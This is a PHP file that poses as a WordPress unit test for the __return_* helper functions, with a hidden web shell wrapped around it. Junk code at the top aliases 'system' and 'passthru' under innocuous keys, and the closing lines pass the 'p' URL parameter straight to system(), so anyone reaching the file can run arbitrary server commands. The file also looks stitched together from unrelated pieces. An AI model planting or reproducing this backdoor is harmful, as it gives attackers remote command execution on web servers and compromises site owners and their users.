<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Tests for __return_** set of functions
 *
 * @since 5.1.0
 *
 * @group functions
 */
class Tests_Functions_UnderscoreReturn extends WP_UnitTestCase {

	/**
	 * @covers ::__return_true
	 */
	public function test__return_true() {
		$this->assertTrue( __return_true() );
	}

	/**
	 * @covers ::__return_false
	 */
	public function test__return_false() {
		$this->assertFalse( __return_false() );
	}

	/**
	 * @covers ::__return_zero
	 */
	public function test__return_zero() {
		$this->assertSame( 0, __return_zero() );
	}

	/**
	 * @covers ::__return_empty_array
	 */
	public function test__return_empty_array() {
		$this->assertSame( array(), __return_empty_array() );
	}

	/**
	 * @covers ::__return_null
	 */
	public function test__return_null() {
		$this->assertNull( __return_null() );
	}

	/**
	 * @covers ::__return_empty_string
	 */
	public function test__return_empty_string() {
		$this->assertSame( '', __return_empty_string() );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>